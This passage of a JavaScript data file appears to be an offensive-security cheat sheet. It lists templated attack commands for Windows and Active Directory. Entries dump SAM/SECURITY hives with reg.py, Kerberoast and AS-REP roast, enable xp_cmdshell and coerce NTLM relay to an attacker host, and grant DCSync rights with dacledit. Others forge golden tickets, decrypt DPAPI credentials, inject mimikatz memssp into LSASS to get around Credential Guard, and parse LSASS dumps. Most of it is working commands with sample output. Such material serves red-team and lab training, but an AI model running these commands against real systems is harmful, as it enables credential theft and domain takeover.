copy C:\\Windows\\win.ini .
`
            },
            {
                title: "Utilizing 'smbclient.py'",
                explanation: "Interact with an SMB share using smbclient.py",
                language: bash,
                command: `smbclient.py`,
                command_variation: `# 1. Connect to a remote smb share within an SMB shell
smbclient.py '{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
smbclient.py -hashes '{{HASH}}' '{{USERNAME}}'@{{RHOST}}

# 2. Connect to a remote domain host
smbclient.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}
smbclient.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'@{{RHOST}}

# 3. connect to a remote smb share using kerberos authentication
smbclient.py -k -no-pass '{{HOSTNAME}}'.'{{DOMAIN}}'.'{{ROOTDNS}}'

# list shares: shares
# connect to share: use <sharename>
`
            },
            {
                title: "Utilizing 'reg.py'",
                explanation: "Interact with windows remote registry using reg.py",
                language: bash,
                command: `reg.py`,
                command_variation: `# 1. dump the SAM, SYTEM and SECURITY registry of a windows host, and save it to the sysvol share
reg.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} save -keyName 'HKLM\\SAM' -o '\\\\{{RHOST}}\\SYSVOL\\'
reg.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} save -keyName 'HKLM\\SYSTEM' -o '\\\\{{RHOST}}\\SYSVOL\\'
reg.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} save -keyName 'HKLM\\SECURITY' -o '\\\\{{RHOST}}\\SYSVOL\\'`
            },
            {
                title: "Utilizing 'GetADUsers.py'",
                explanation: "Retrieve all users from the domain by utilizing GetADUsers.py.",
                language: bash,
                command: `GetADUsers.py`,
                command_variation: `# 1 retrieve a list of all AD user accounts, edit it yourself to save it a list
GetADUsers.py {{DOMAIN}}.{{ROOTDNS}}/{{USERNAME}}:'{{PASSWORD}}' -all

# 2 retrieve a list of all AD user accounts, edit it yourself to save it a list
GetADUsers.py {{DOMAIN}}.{{ROOTDNS}}/{{USERNAME}}:'{{PASSWORD}}' -all | awk '{print $1}'`
            },
            {
                title: "Utilizing 'GetUserSPNs.py'",
                explanation: "Finds service accounts with SPNs, grabs TGS tickets for cracking (Kerberoasting). Requires valid domain creds.",
                language: bash,
                command: `GetUserSPNs.py # Kerberoast`,
                command_variation: `# 1 retrieve all - KERBEROAST - able accounts from the domain
GetUserSPNs.py {{DOMAIN}}.{{ROOTDNS}}/{{USERNAME}}:'{{PASSWORD}}' -dc-ip {{RHOST}} -request`
            },
            {
                title: "Utilizing 'GetNPUsers.py'",
                explanation: "Finds accounts without Kerberos pre-auth, grabs AS-REP tickets for offline cracking (AS-REP roasting). No login needed.",
                language: bash,
                command: `GetNPUsers.py # AS-REP roast`,
                command_variation: `# 1 retrieve all - AS-REP roast - able accounts from the domain in hashcat format
GetNPUsers.py {{DOMAIN}}.{{ROOTDNS}}/ -usersfile users.txt -format hashcat`
            },
            {
                title: "Utilizing 'mssqlclient.py'",
                explanation: "Interact with mssql using mssqlcient.py",
                language: bash,
                command: `mssqlclient.py`,
                command_variation: `# 1. connect to a remote host
mssqlclient.py -windows-auth '{{DOMAIN}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}}

##### WITHIN interactive mode
# 1A. list directory structure on current host
xp_dirtree 'C:\\'

# 1B. perform an ntlm-relay attack
xp_dirtree //{{LHOST}}/randomShare

# 1C. check if you can impersonate a user
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

# impersonate that user (if possible)
EXECUTE AS LOGIN = '<TARGET-USERNAME>';

# 1D. execute a command using xp_cmdshell
xp_cmdshell 'whoami'

#### enabling xp_cmdshell if it is disabled
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#### disabling xp_cmdshell again (if needed)
EXEC sp_configure 'xp_cmdshell', 0;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
`
            },
            {
                title: "Utilizing 'dacledit.py'",
                explanation: "Alter the permissions of an object in the Active Directory",
                language: bash,
                command: `dacledit.py # AD object permissions`,
                command_variation: `# 1. "WriteDacl" permissions : Grant DCSync rights to a user in the domain 
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_user' -target-dn 'DC={{DOMAIN}},DC={{ROOTDNS}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'

# 2. "WriteMembers" permissions : Add a user to a group in the domain
dacledit.py -action 'write' -rights 'WriteMembers' -principal '_CONTROLLED-USER_' -target-dn 'CN=<GROUP>,CN=<USERS>,DC={{DOMAIN}},DC={{ROOTDNS}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'
`
            },
            {
                title: "Utilizing 'getTGT.py'",
                explanation: "Generate a Kerberos TGT for a user",
                language: bash,
                command: `getTGT.py # Kerberos TGT (use with ticketer.py)`,
                command_variation: `# 1. Generate a Kerberos TGT for a user and save it to a ccache file (can be used in combination with ticketer.py)
getTGT.py -dc-ip {{RHOST}} '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'

# 2. Generate a TGT file - with NTLM hash
getTGT.py -hashes '{{HASH}}' -dc-ip {{RHOST}} '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'
`
            },
            {
                title: "Utilizing 'ticketer.py'",
                explanation: "Impersonate a user by creating a (Golden) Ticket and saving it to a ccache file",
                language: bash,
                command: `ticketer.py # impersonate a user`,
                command_variation: `# 1. Impersonate a user by creating a (Golden/ silver) Ticket and saving it to a ccache file - SPN is where permissions are derived from
ticketer.py -nthash '{{HASH}}' -domain-sid '{{DOMAIN-SID}}' -domain '{{DOMAIN}}'.'{{ROOTDNS}}' -spn <USER_SPN> -user-id 500 Administrator                
`
            },
        ]
    },
    {
        chapter: "5. Password/ credentials extraction",
        chapter_commands: [
            {
                title: "Utilizing 'mimikatz::dpapi'",
                explanation: "Use the mimikatz utility - dpapi (data protection API)",
                language: bash,
                command: `mimikatz::dpapi`,
                command_variation: `##### 1. Extract the credentials of an administrator user, that was saved in cmdkey /list of a regular user; 
# reference: https://www.youtube.com/watch?v=Rr6Oxrj2IjU&list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn&index=13
# reference: https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
                
# REQUIREMENTS: 
# A. There are creds stored in cmdkey of the current user (cmdkey /list)
# B. You know the password of the current user

# list the following directory & note the SID (e.g. : S-1-5-21-953262931-566350628-63446256-1001)
C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Protect\\

# Copy the GUID (masterkey) to your local box (e.g. : 0792c32e-48a5-4fe3-8b43-d93d64590580) 
copy C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-953262931-566350628-63446256-1001\\0792c32e-48a5-4fe3-8b43-d93d64590580 y:\\

# Copy the cred key file to your local box, e.g.:
copy C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 y:\\

# On your own Windows box, start mimikatz.exe and execute the following commands (make sure mimikatz.exe is in the same directory as the files you just copied)
dpapi::masterkey /in:0792c32e-48a5-4fe3-8b43-d93d64590580 /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290`
            },
            {
                title: "Utilizing 'mimikatz::memssp'",
                explanation: "Use the mimikatz utility - memssp",
                language: bash,
                command: `mimikatz::memssp # credentialguard bypass - capture new logons`,
                command_variation: `##### 1. Credential Guard Bypass
# When Credential Guard is enabled, direct LSASS memory dumps won't yield 
# logon credentials—they're isolated in a virtualized container.
#
# Alternative: Use the memssp module to inject a rogue SSP (Security Support 
# Provider) into LSASS. This intercepts credentials in plaintext as users 
# authenticate, effectively capturing new logons in real-time.            
                
# REQUIREMENTS: 
# A. credentialguard is enabled on the target host
# B. you have administrator access on the target host
# C. you cannot retrieve the lsass dump directly

# 1. verify if credentialguard is enabled
[bool](get-computerinfo).DeviceGuardSecurityServicesRunning
[bool](get-computerinfo).DeviceGuardSecurityServicesConfigured

# false = credentialguard disabled
# true = credentialguard enabled

# 2. run mimikatz.exe, and execute the following command to monitor new logins
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)

# you can find the captured credentials in the mimikatz log file - 'C:\\Windows\\System32\\mimilsa.log'
PS C:\\windows\\system32> type mimilsa.log
[00000000:00bbb1d9] CORP\\CLIENTWK245$
[00000000:00bbb7f4] CORP\\CLIENTWK245$
[00000000:00bbb9cf] CORP\\CLIENTWK245$
[00000000:00bc152f] CORP\\Administrator  QWERTY123!@#
`
            },
            {
                title: "Utilizing 'dpapi.py'",
                explanation: "Use the dpapi.py utility to extract DPAPI secrets",
                language: bash,
                command: "dpapi.py",
                command_variation: `##### OPTION 1: Using dpapi.py to extract credentials from DPAPI files
# reference: 
https://0xdf.gitlab.io/2025/11/01/htb-voleur.html#

##### requirements:
# A. SID of the user
# B. Password of the user
# C. Masterkey file (from AppData\Roaming\Microsoft\Protect\<USER_SID>\<MASTERKEY_GUID>)
# D. Credential file (from AppData\Roaming\Microsoft\Credentials\<CRED_FILE>)

# 1. retrieve the masterkey (save it for command 2)
dpapi.py masterkey -file <MASTER_KEY_FILE> -sid <USER_SID> -password <USER_PASSWORD>

# 2. retrieve the credentials
dpapi.py credential -file <CRED_FILE> -key <MASTERKEY_PASSWORD_HEX>

##### Example: (voleur.htb) - home directory of user 'todd.wolfe'
# 1. retrieve the masterkey (save it for command 2)
dpapi.py masterkey -file AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

# 2. retrieve the credentials
dpapi.py credential -file AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
`
            },
            {
                title: "Utilizing 'pypykatz'",
                explanation: "Use 'pypykatz' to extract credentials from memory dumps or live systems.",
                language: bash,
                command: `pypykatz`,
                command_variation: `# 1. Use pypykatz to extract credentials from a LSASS memory dump and save it to a file
pypykatz lsa minidump lsass.dmp | tee lsass-dump-read.txt`
            },
        ]
    }
];

